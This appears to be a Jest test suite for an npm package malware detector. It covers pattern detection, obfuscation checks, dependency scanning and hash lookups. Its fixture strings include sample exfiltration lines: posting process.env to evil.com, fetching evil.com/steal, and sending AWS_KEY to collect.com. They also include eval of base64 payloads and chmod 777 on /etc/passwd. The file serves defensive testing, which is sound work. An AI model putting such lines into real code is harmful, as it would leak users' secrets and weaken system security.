const Detector = require('../src/core/detector');
const fs = require('fs');
const path = require('path');

jest.mock('fs');
jest.mock('axios');

describe('Malware Detector', () => {
  let detector;

  beforeEach(() => {
    jest.clearAllMocks();
    detector = new Detector();
    // Mock required methods
    detector.getPackageMetadata = jest.fn().mockResolvedValue({
      name: 'test-package',
      version: '1.0.0',
      dependencies: {
        'safe-pkg': '1.0.0',
        'vuln-pkg': '1.0.0'
      }
    });
  });

  describe('deep analysis', () => {
    test('detectSuspiciousPatterns identifies malicious code', () => {
      const maliciousCode = `
        eval(Buffer.from('base64string').toString());
        process.env.AWS_SECRET && http.post('evil.com', process.env);
        new WebSocket('ws://suspicious.com');
      `;

      const patterns = detector.detectSuspiciousPatterns(maliciousCode);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns.some(p => p.includes('eval'))).toBe(true);
      expect(patterns.some(p => p.includes('environment variable'))).toBe(true);
    });

    test('analyzeTarball detects known malware hashes', async () => {
      fs.readFileSync.mockReturnValue('malicious content');
      detector.isKnownMalware = jest.fn().mockReturnValue(true);

      const results = await detector.analyzeTarball('suspicious-package', '1.0.0');
      expect(results.malwareDetected).toBe(true);
      expect(results.score).toBe(0);
    });

    test('checkNetworkBehavior detects suspicious URLs', () => {
      const code = `
        fetch('https://evil.com/steal');
        new WebSocket('wss://mining.com');
      `;

      const issues = detector.checkNetworkBehavior(code);
      expect(issues.length).toBeGreaterThan(0);
      expect(issues.some(i => i.includes('Suspicious URL'))).toBe(true);
      expect(issues.some(i => i.includes('WebSocket'))).toBe(true);
    });
  });

  describe('code analysis', () => {
    test('detectObfuscatedCode identifies suspicious patterns', () => {
      const testCases = [
        { code: 'eval(atob("YWxlcnQoMSk="))', expected: true },
        { code: 'new Function("return " + encoded)', expected: true },
        { code: 'console.log("normal code")', expected: false }
      ];

      testCases.forEach(({ code, expected }) => {
        expect(detector.detectObfuscatedCode(code)).toBe(expected);
      });
    });

    test('checkFilePermissions detects dangerous operations', () => {
      const testCases = [
        { code: 'fs.chmodSync("/etc/passwd", 777)', expected: true },
        { code: 'fs.writeFileSync("/etc/hosts", data)', expected: true },
        { code: 'fs.readFileSync("./config.json")', expected: false }
      ];

      testCases.forEach(({ code, expected }) => {
        expect(detector.checkFilePermissions(code)).toBe(expected);
      });
    });

    test('analyzeCodeComplexity identifies suspicious complexity', () => {
      const complexCode = `
        function a(x){return b(x)?c(x):d(x)}
        function b(x){return e(x)||f(x)}
        function c(x){return g(x)&&h(x)}
      `;
      
      const metrics = detector.analyzeCodeComplexity(complexCode);
      expect(metrics.cyclomaticComplexity).toBeGreaterThan(5);
    });
  });

  describe('dependency analysis', () => {
    test('checkDependencyTree identifies vulnerable dependencies', async () => {
      const mockDeps = {
        'safe-pkg': { version: '1.0.0', score: 90 },
        'vuln-pkg': { version: '1.0.0', score: 30 }
      };

      detector.analyzeTarball = jest.fn().mockImplementation((pkg) => 
        Promise.resolve({
          score: mockDeps[pkg].score,
          malwareDetected: mockDeps[pkg].score < 50
        })
      );

      const vulnerabilities = await detector.checkDependencyTree('test-package');
      expect(vulnerabilities.some(v => v.package === 'vuln-pkg')).toBe(true);
    });

    test('checkTransitiveDependencies analyzes deep dependencies', async () => {
      const mockDeps = {
        'pkg-a': { dependencies: { 'pkg-b': '1.0.0' } },
        'pkg-b': { dependencies: { 'vuln-pkg': '1.0.0' } }
      };

      detector.getDependencyTree = jest.fn().mockResolvedValue(mockDeps);
      
      const issues = await detector.checkTransitiveDependencies('test-pkg');
      expect(issues.some(i => i.package === 'vuln-pkg')).toBe(true);
    });
  });

  describe('security critical functions', () => {
    test('detectSuspiciousPatterns handles all pattern types', () => {
      const testCases = [
        { 
          code: 'eval("alert(1)")', 
          expected: 'code-execution'
        },
        { 
          code: 'process.env.SECRET', 
          expected: 'data-access'
        },
        { 
          code: 'new WebSocket("ws://evil.com")', 
          expected: 'network'
        },
        { 
          code: 'Buffer.from("test").toString("base64")', 
          expected: 'obfuscation'
        }
      ];

      testCases.forEach(({ code, expected }) => {
        const patterns = detector.detectSuspiciousPatterns(code);
        expect(patterns.some(p => p.includes(expected))).toBe(true);
      });
    });

    test('checkNetworkBehavior detects all suspicious patterns', () => {
      const code = `
        fetch('https://evil.com/steal');
        new WebSocket('wss://mining.com');
        process.env.AWS_KEY && fetch('https://collect.com');
      `;

      const issues = detector.checkNetworkBehavior(code);
      expect(issues).toHaveLength(3);
      expect(issues.some(i => i.includes('Critical'))).toBe(true);
    });
  });

  describe('File System Operations', () => {
    beforeEach(() => {
      fs.readFileSync.mockReset();
      fs.readdirSync.mockReset();
    });

    test('getAllFiles traverses directories correctly', () => {
      fs.readdirSync.mockReturnValueOnce([
        { name: 'index.js', isFile: () => true, isDirectory: () => false },
        { name: 'src', isFile: () => false, isDirectory: () => true }
      ]);
      fs.readdirSync.mockReturnValueOnce([
        { name: 'util.js', isFile: () => true, isDirectory: () => false }
      ]);

      const files = detector.getAllFiles('/test');
      expect(files).toContain('/test/index.js');
      expect(files).toContain('/test/src/util.js');
    });

    test('calculateFileHash generates correct hash', () => {
      const content = 'test content';
      const hash = detector.calculateFileHash(content);
      expect(hash).toMatch(/^[a-f0-9]{64}$/);
    });

    test('isMaliciousFilename detects suspicious files', () => {
      expect(detector.isMaliciousFilename('eval.js')).toBe(true);
      expect(detector.isMaliciousFilename('normal.js')).toBe(false);
    });

    test('isKnownMalware checks malware database', () => {
      const hash = detector.calculateFileHash('malicious content');
      detector.knownMalwareHashes.add(hash);
      expect(detector.isKnownMalware(hash)).toBe(true);
    });
  });
});
